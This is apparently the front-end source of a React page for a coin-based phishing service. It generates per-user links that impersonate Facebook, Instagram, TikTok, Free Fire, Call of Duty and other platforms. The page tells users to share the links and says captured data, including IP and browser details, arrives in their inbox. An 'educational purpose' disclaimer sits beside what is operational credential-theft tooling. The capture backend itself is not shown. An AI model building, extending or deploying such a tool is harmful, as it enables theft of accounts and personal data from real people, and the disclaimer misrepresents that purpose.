import { useState } from 'react';
import Layout from '@/components/Layout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Fish, ExternalLink, Coins, Shield } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

const Phishing = () => {
  const [userCoins, setUserCoins] = useState(
    JSON.parse(localStorage.getItem('currentUser') || '{}').coins || 0
  );
  const { toast } = useToast();

  const platforms = [
    { name: 'Facebook', icon: '📘', color: 'bg-blue-600' },
    { name: 'Twitter', icon: '🐦', color: 'bg-sky-500' },
    { name: 'Instagram', icon: '📷', color: 'bg-pink-500' },
    { name: 'LinkedIn', icon: '💼', color: 'bg-blue-700' },
    { name: 'TikTok', icon: '🎵', color: 'bg-black' },
    { name: 'Snapchat', icon: '👻', color: 'bg-yellow-400' },
    { name: 'Free Fire', icon: '🔥', color: 'bg-orange-500' },
    { name: 'Call of Duty', icon: '⚔️', color: 'bg-yellow-600' }
  ];

  const handlePlatformClick = (platform: string) => {
    if (userCoins < 3) {
      toast({
        title: 'Insufficient Coins',
        description: 'You need 3 coins to access phishing tools. Please top up your account.',
        variant: 'destructive'
      });
      return;
    }

    // Deduct coins
    const currentUser = JSON.parse(localStorage.getItem('currentUser') || '{}');
    const updatedUser = {
      ...currentUser,
      coins: currentUser.coins - 3,
      transactions: [
        ...(currentUser.transactions || []),
        {
          description: `Accessed ${platform} phishing tool`,
          amount: -3,
          timestamp: Date.now()
        }
      ]
    };
    
    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
    localStorage.setItem(`user_${currentUser.id}`, JSON.stringify(updatedUser));
    setUserCoins(updatedUser.coins);

    // Generate the actual phishing page URL
    const baseUrl = window.location.origin;
    const phishingUrl = `${baseUrl}/phishing/${platform.toLowerCase().replace(' ', '')}/${currentUser.id}`;
    
    toast({
      title: 'Tool Activated',
      description: `${platform} phishing page generated successfully. 3 coins deducted.`
    });

    // Copy URL to clipboard and show it
    navigator.clipboard.writeText(phishingUrl);
    
    // Show the generated URL
    setTimeout(() => {
      alert(`Phishing URL Generated:\n\n${phishingUrl}\n\nURL copied to clipboard!`);
    }, 500);
  };

  return (
    <Layout>
      <div className="space-y-6">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-2">Phishing Tools</h1>
          <p className="text-gray-400">Social media platform simulation tools</p>
        </div>

        {/* Cost Warning */}
        <Card className="bg-orange-900/20 border-orange-500/50 backdrop-blur">
          <CardContent className="p-6">
            <div className="flex items-start gap-3">
              <Shield className="h-6 w-6 text-orange-400 mt-1 flex-shrink-0" />
              <div>
                <h3 className="text-lg font-semibold text-orange-400 mb-2">Tool Cost & Disclaimer</h3>
                <div className="space-y-2 text-gray-300">
                  <p className="flex items-center gap-2">
                    <Coins className="h-4 w-4 text-yellow-400" />
                    Each platform tool costs <strong>3 coins</strong> to activate
                  </p>
                  <p className="flex items-center gap-2">
                    <ExternalLink className="h-4 w-4 text-blue-400" />
                    Generated pages are unique to your User ID
                  </p>
                  <p className="text-sm text-yellow-300 bg-yellow-900/20 p-2 rounded">
                    <strong>Educational Purpose:</strong> These tools are for cybersecurity education and awareness training only.
                  </p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Current Balance */}
        <Card className="bg-gradient-to-r from-blue-600 to-purple-600 border-0">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <span className="text-white">Your Balance:</span>
              <div className="flex items-center gap-2">
                <Coins className="h-5 w-5 text-yellow-400" />
                <span className="text-xl font-bold text-white">{userCoins} coins</span>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Platform Grid */}
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
          {platforms.map((platform) => (
            <Card 
              key={platform.name}
              className="bg-slate-800/50 border-slate-700 backdrop-blur hover:bg-slate-800/70 transition-all duration-300 hover:scale-105 cursor-pointer"
              onClick={() => handlePlatformClick(platform.name)}
            >
              <CardContent className="p-4 text-center">
                <div className={`h-16 w-16 ${platform.color} rounded-xl flex items-center justify-center mx-auto mb-3 text-2xl`}>
                  {platform.icon}
                </div>
                <h3 className="text-white font-semibold mb-2">{platform.name}</h3>
                <Badge className="bg-orange-500/20 text-orange-400 text-xs">
                  3 coins
                </Badge>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* How It Works */}
        <Card className="bg-slate-800/50 border-slate-700 backdrop-blur">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Fish className="h-5 w-5" />
              How Phishing Tools Work
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <h4 className="text-blue-400 font-semibold mb-2">Process:</h4>
                <ol className="text-gray-300 space-y-1 text-sm">
                  <li>1. Click on any platform above</li>
                  <li>2. 3 coins will be deducted from your balance</li>
                  <li>3. A unique phishing page will be generated</li>
                  <li>4. Share the link for educational demonstrations</li>
                  <li>5. Captured data appears in your Inbox</li>
                </ol>
              </div>
              <div>
                <h4 className="text-green-400 font-semibold mb-2">Features:</h4>
                <ul className="text-gray-300 space-y-1 text-sm">
                  <li>• Realistic platform mimicry</li>
                  <li>• User-specific data collection</li>
                  <li>• IP and browser information capture</li>
                  <li>• Secure data storage in your inbox</li>
                  <li>• Educational documentation included</li>
                </ul>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </Layout>
  );
};

export default Phishing;
